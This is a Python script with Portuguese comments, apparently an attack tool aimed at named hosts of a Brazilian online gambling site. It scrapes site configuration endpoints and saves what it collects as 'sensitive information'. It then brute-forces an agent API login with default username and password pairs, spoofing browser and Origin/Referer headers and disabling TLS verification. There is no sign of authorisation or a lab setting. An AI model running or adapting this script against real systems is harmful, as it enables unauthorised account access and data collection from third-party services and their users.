#!/usr/bin/env python3
import requests
import json
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_API = "https://vipvip.vip999jogo.com/hall/api/agent/promote/linkSetting"
# Outros endpoints interessantes descobertos
ENDPOINTS = [
    "https://vipvip.vip999jogo.com/hall/api/agent/promote/getIpBindInfo",
    "https://oogojsndpiv.vipdnsjogo.com/hall/api/lobby/site/getSiteInfo/language/pt.json",
    "https://oogojsndpiv.vipdnsjogo.com/hall/api/lobby/webapi/optimizationV2/site/config/language/pt.json"
]

def test_brute_force_api(url):
    print(f"üöÄ Iniciando For√ßa Bruta na API: {url}")
    
    users = ["admin", "root", "suporte", "123456"]
    passwords = ["admin", "123456", "password", "admin123"]
    
    for user in users:
        for pwd in passwords:
            payload = {
                "username": user,
                "password": pwd,
                "device": "web",
                "timestamp": int(time.time())
            }
            try:
                # Simular requisi√ß√£o real com headers de navegador
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/json",
                    "Origin": "https://99jogo66.com",
                    "Referer": "https://99jogo66.com/"
                }
                
                response = requests.post(url, json=payload, headers=headers, timeout=5, verify=False)
                print(f"  [TESTE] User: {user} | Pwd: {pwd} | Status: {response.status_code}")
                
                if response.status_code == 200:
                    print(f"  ‚úÖ SUCESSO! Credenciais encontradas: {user}:{pwd}")
                    return True
            except Exception as e:
                print(f"  ‚ùå Erro: {e}")
    return False

if __name__ == "__main__":
    print("=== M√ìDULO DE EXPLORA√á√ÉO DE API REAL ===")
    for ep in ENDPOINTS:
        if "config" in ep or "siteInfo" in ep:
            print(f"üîç Coletando informa√ß√µes sens√≠veis de: {ep}")
            try:
                res = requests.get(ep, timeout=5, verify=False)
                if res.status_code == 200:
                    print(f"  ‚úÖ Dados coletados! Salvando em logs/api_data_{int(time.time())}.json")
                    with open(f"logs/api_data_{int(time.time())}.json", "w") as f:
                        json.dump(res.json(), f, indent=2)
            except:
                pass
        
    # Testar for√ßa bruta no endpoint principal
    test_brute_force_api(TARGET_API)
